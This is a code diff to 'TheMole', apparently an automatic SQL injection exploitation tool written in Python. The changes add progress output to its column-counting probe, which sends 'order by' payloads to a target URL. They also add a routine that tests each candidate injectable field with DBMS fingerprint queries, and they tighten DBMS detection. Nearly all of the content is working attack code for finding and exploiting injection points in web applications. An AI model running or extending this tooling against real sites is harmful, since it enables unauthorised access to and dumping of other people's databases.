@@ -25,6 +25,7 @@
 from domanalyser import DomAnalyser,NeedleNotFound
 from dbmsmoles import Mysql5Mole
 from dbdump import DatabaseDump
+import sys
 
 class TheMole:
     
@@ -255,39 +256,6 @@ class TheMole:
             raise QueryError()
         else:
             return result
-
-    def guess_users_table(self):
-        raise Exception('This is not needed in this dumper. Use adhoc queries instead.')
-    
-    def guessed_table_count_query(self):
-        raise Exception(self.ex_string)
-    
-    def guessed_table_query(self, index):
-        raise Exception(self.ex_string)
-    
-    def table_count_query(self):
-        raise Exception(self.ex_string)
-        
-    def table_name_query(self, index):
-        raise Exception(self.ex_string)
-        
-    def table_columns_query(self, table, index):
-        raise Exception(self.ex_string)
-        
-    def table_columns_count_query(self, table):
-        raise Exception(self.ex_string)
-        
-    def adhoc_count_query(self, table):
-        raise Exception(self.ex_string)
-        
-    def adhoc_query(self, table, fields, index):
-        raise Exception(self.ex_string)
-        
-    def get_delimiter(self):
-        raise Exception(self.ex_string)
-        
-    def get_result_index(self):
-        raise Exception(self.ex_string)
     
     def _find_separator(self):
         separator_list = ['\'', '"', ' ']
@@ -353,14 +321,20 @@ class TheMole:
         )
         while new_needle_content != content_of_needle:
             last *= 2
+            sys.stdout.write('\r[i] Trying length: ' + str(last) + '     ')
+            sys.stdout.flush()
             new_needle_content = self.analyser.node_content(
                 self.get_requester().request(
                     self.generate_url('{sep}{par} order by %d {com}' % (last,))
                 )
             )
         pri = last // 2
+        sys.stdout.write('\r[i] Maximum length: ' + str(last) + '     ')
+        sys.stdout.flush()
         while pri < last:
             medio = ((pri + last) // 2) + ((pri + last) & 1)
+            sys.stdout.write('\r[i] Trying length: ' + str(medio) + '    ')
+            sys.stdout.flush()
             new_needle_content = self.analyser.node_content(
                 self.get_requester().request(
                     self.generate_url('{sep}{par} order by %d {com}' % (medio,))
@@ -371,7 +345,7 @@ class TheMole:
             else:
                 last = medio - 1
         self.query_columns = pri
-        print("[+] Found number of columns:", self.query_columns)
+        print("\r[+] Found number of columns:", self.query_columns)
     
     def _find_injectable_field(self):
         used_hashes = set()
@@ -386,12 +360,28 @@ class TheMole:
                         )
                     ).decode(self.analyser.encoding)
                 try:
-                    self.injectable_field = int(next(hash for hash in to_search_hashes if hash in req)) - base
-                    print("[+] Injectable field found:", self.injectable_field)
+                    self.injectable_fields = list(map(lambda x: int(x) - base, [hash for hash in to_search_hashes if hash in req]))
+                    print("[+] Injectable fields found:", ', '.join(map(str, self.injectable_fields)))
+                    self._filter_injectable_fields()
                     return
                 except Exception as ex:
+                    print(ex)
                     used_hashes.add(hash_string)                
         raise SQLInjectionNotExploitable()
+
+    def _filter_injectable_fields(self):
+        for field in self.injectable_fields:
+            print('[i] Trying field', field)
+            for dbms_mole_class in TheMole.dbms_mole_list:
+                query = dbms_mole_class.field_finger_query(self.query_columns,
+                                                     field)
+                url_query = self.generate_url(query)
+                req = self.get_requester().request(url_query)
+                if dbms_mole_class.field_finger() in self.analyser.node_content(req):
+                    self.injectable_field = field
+                    print('[+] Found injectable field:', field)
+                    return
+        raise Exception('[-] Could not inject.')
 
     def _detect_dbms(self):
         for dbms_mole_class in TheMole.dbms_mole_list:
@@ -400,8 +390,11 @@ class TheMole:
             url_query = self.generate_url(query)
             req = self.get_requester().request(url_query)
             if self.analyser.node_content(req) != self._syntax_error_content:
-                break
-        self._dbms_mole = dbms_mole_class()
+                self._dbms_mole = dbms_mole_class()
+                print('[+] Found DBMS:', dbms_mole_class.dbms_name())
+                return
+        raise Exception('[-] Could not detect DBMS')
+        
 
 
 class TableNotDumped(Exception):
